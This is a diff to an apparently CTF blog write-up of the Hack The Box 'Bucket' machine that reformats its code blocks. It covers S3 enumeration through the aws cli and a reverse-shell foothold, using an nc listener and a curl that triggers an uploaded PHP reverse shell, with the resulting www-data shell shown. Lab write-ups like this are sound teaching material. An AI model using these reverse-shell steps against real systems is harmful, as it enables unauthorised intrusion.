@@ -20,6 +20,7 @@ Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&g
 &lt;/pre&gt;&lt;/div&gt;
 
 
+&lt;p&gt;Result: &lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//IETF//DTD HTML 2.0//EN&amp;quot;&amp;gt;&lt;/span&gt;
 &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
 &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;302 Found&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
@@ -48,13 +49,14 @@ Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&g
 &lt;/pre&gt;&lt;/div&gt;
 
 
+&lt;p&gt;Result:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;Error&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;Code&amp;gt;&lt;/span&gt;NoSuchKey&lt;span class="nt"&gt;&amp;lt;/Code&amp;gt;&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;lt;Message&amp;gt;&lt;/span&gt;The specified key does not exist.&lt;span class="nt"&gt;&amp;lt;/Message&amp;gt;&lt;/span&gt;
 
     &lt;span class="nt"&gt;&amp;lt;RequestID&amp;gt;&lt;/span&gt;7a62c49f-347e-4fc4-9331-6e8eEXAMPLE&lt;span class="nt"&gt;&amp;lt;/RequestID&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;/Error&amp;gt;&lt;/span&gt;┌─[pawel@parrot]─[~]
+&lt;span class="nt"&gt;&amp;lt;/Error&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -62,13 +64,17 @@ Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&g
 &lt;/pre&gt;&lt;/div&gt;
 
 
+&lt;p&gt;Result:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;running&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://s3.bucket.htb/&amp;quot;&lt;/span&gt;
-&lt;span class="sb"&gt;```&lt;/span&gt;json
-&lt;span class="sb"&gt;```&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;running&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Result:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;running&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -83,7 +89,7 @@ Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&g
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;And hey, what we have here!?&lt;/p&gt;
+&lt;p&gt;And hey, what we have here?!&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;=====================================================================
 ID           Response   Lines    Word       Chars       Payload                                                                                   
 =====================================================================
@@ -97,7 +103,7 @@ ID           Response   Lines    Word       Chars       Payload
 &lt;p&gt;We are definitly going somewhere. For now just note that discovery.&lt;/p&gt;
 &lt;p&gt;For now we can try last, but most important thing: use the &lt;strong&gt;aws&lt;/strong&gt; cli. It is already on your system or just install it from system repo.&lt;/p&gt;
 &lt;p&gt;Now the param &lt;strong&gt;--endpoint-url&lt;/strong&gt; will be crucial. Lets try:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url=http://s3.bucket.htb s3 ls adserver/
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb s3 ls adserver/
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -120,22 +126,28 @@ ID           Response   Lines    Word       Chars       Payload
 
 &lt;p&gt;Now we can try to execute it:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nc -lvnp &lt;span class="m"&gt;4321&lt;/span&gt; &lt;span class="c1"&gt;# in one term&lt;/span&gt;
-&lt;span class="c1"&gt;# next that below in another:&lt;/span&gt;
-curl http://bucket.htb/php-reverse-shell.php
-&lt;span class="c1"&gt;# BOOM, we got the foothold&lt;/span&gt;
-listening on &lt;span class="o"&gt;[&lt;/span&gt;any&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;4321&lt;/span&gt; ...
-connect to &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.14.11&lt;span class="o"&gt;]&lt;/span&gt; from &lt;span class="o"&gt;(&lt;/span&gt;UNKNOWN&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.10.212&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;54924&lt;/span&gt;
-Linux bucket &lt;span class="m"&gt;5&lt;/span&gt;.4.0-48-generic &lt;span class="c1"&gt;#52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
- &lt;span class="m"&gt;22&lt;/span&gt;:03:15 up  &lt;span class="m"&gt;3&lt;/span&gt;:08,  &lt;span class="m"&gt;1&lt;/span&gt; user,  load average: &lt;span class="m"&gt;0&lt;/span&gt;.01, &lt;span class="m"&gt;0&lt;/span&gt;.20, &lt;span class="m"&gt;0&lt;/span&gt;.25
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-roy      pts/1    &lt;span class="m"&gt;10&lt;/span&gt;.10.14.11      &lt;span class="m"&gt;18&lt;/span&gt;:59   &lt;span class="m"&gt;56&lt;/span&gt;.00s  &lt;span class="m"&gt;0&lt;/span&gt;.44s  &lt;span class="m"&gt;0&lt;/span&gt;.44s -bash
-&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;33&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;www-data&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;33&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;www-data&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;33&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;www-data&lt;span class="o"&gt;)&lt;/span&gt;
-/bin/sh: &lt;span class="m"&gt;0&lt;/span&gt;: can&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t access tty&lt;span class="p"&gt;;&lt;/span&gt; job control turned off
-$ 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;We are inside!&lt;/p&gt;
+&lt;p&gt;Next that below in another:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl http://bucket.htb/php-reverse-shell.php
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then what we see on the &lt;strong&gt;nc&lt;/strong&gt; awaiting for connection?&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;listening&lt;/span&gt; &lt;span class="nt"&gt;on&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;4321&lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;
+&lt;span class="nt"&gt;connect&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mf"&gt;10.10.14.11&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;from&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;UNKNOWN&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mf"&gt;10.10.10.212&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;54924&lt;/span&gt;
+&lt;span class="nt"&gt;Linux&lt;/span&gt; &lt;span class="nt"&gt;bucket&lt;/span&gt; &lt;span class="nt"&gt;5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0-48-generic&lt;/span&gt; &lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;52-Ubuntu&lt;/span&gt; &lt;span class="nt"&gt;SMP&lt;/span&gt; &lt;span class="nt"&gt;Thu&lt;/span&gt; &lt;span class="nt"&gt;Sep&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;58&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;49&lt;/span&gt; &lt;span class="nt"&gt;UTC&lt;/span&gt; &lt;span class="nt"&gt;2020&lt;/span&gt; &lt;span class="nt"&gt;x86_64&lt;/span&gt; &lt;span class="nt"&gt;x86_64&lt;/span&gt; &lt;span class="nt"&gt;x86_64&lt;/span&gt; &lt;span class="nt"&gt;GNU&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;Linux&lt;/span&gt;
+ &lt;span class="nt"&gt;22&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;03&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;15&lt;/span&gt; &lt;span class="nt"&gt;up&lt;/span&gt;  &lt;span class="nt"&gt;3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;08&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;  &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;user&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;  &lt;span class="nt"&gt;load&lt;/span&gt; &lt;span class="nt"&gt;average&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;01&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;20&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;25&lt;/span&gt;
+&lt;span class="nt"&gt;USER&lt;/span&gt;     &lt;span class="nt"&gt;TTY&lt;/span&gt;      &lt;span class="nt"&gt;FROM&lt;/span&gt;             &lt;span class="nt"&gt;LOGIN&lt;/span&gt;&lt;span class="o"&gt;@&lt;/span&gt;   &lt;span class="nt"&gt;IDLE&lt;/span&gt;   &lt;span class="nt"&gt;JCPU&lt;/span&gt;   &lt;span class="nt"&gt;PCPU&lt;/span&gt; &lt;span class="nt"&gt;WHAT&lt;/span&gt;
+&lt;span class="nt"&gt;roy&lt;/span&gt;      &lt;span class="nt"&gt;pts&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;1&lt;/span&gt;    &lt;span class="nt"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;14&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;11&lt;/span&gt;      &lt;span class="nt"&gt;18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;59&lt;/span&gt;   &lt;span class="nt"&gt;56&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00s&lt;/span&gt;  &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;44s&lt;/span&gt;  &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;44s&lt;/span&gt; &lt;span class="nt"&gt;-bash&lt;/span&gt;
+&lt;span class="nt"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;33&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;www-data&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;33&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;www-data&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;33&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;www-data&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;sh&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;can&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;t&lt;/span&gt; &lt;span class="nt"&gt;access&lt;/span&gt; &lt;span class="nt"&gt;tty&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;job&lt;/span&gt; &lt;span class="nt"&gt;control&lt;/span&gt; &lt;span class="nt"&gt;turned&lt;/span&gt; &lt;span class="nt"&gt;off&lt;/span&gt;
+&lt;span class="o"&gt;$&lt;/span&gt; 
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;BOOM, we are inside!&lt;/p&gt;
 &lt;h1&gt;User&lt;/h1&gt;
 &lt;p&gt;Escalating privileges in this case is quite simple, but we have to combine something new to find, with some foothold info. And with some luck, if it was a real life scenario.&lt;/p&gt;
 &lt;p&gt;Of course it is recomended to start some enumaration scripts in this moment. Like &lt;em&gt;LinEnum&lt;/em&gt; or &lt;em&gt;linpeas&lt;/em&gt; and I encourage you to do it. But lets jump straight to the solution.&lt;/p&gt;
@@ -156,6 +168,7 @@ cat: user.txt: Permission denied
 &lt;/pre&gt;&lt;/div&gt;
 
 
+&lt;p&gt;Result:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;quot;TableNames&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
         &lt;span class="s2"&gt;&amp;quot;users&amp;quot;&lt;/span&gt;
@@ -168,6 +181,7 @@ cat: user.txt: Permission denied
 &lt;/pre&gt;&lt;/div&gt;
 
 
+&lt;p&gt;Result:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="nt"&gt;&amp;quot;Items&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
         &lt;span class="p"&gt;{&lt;/span&gt;
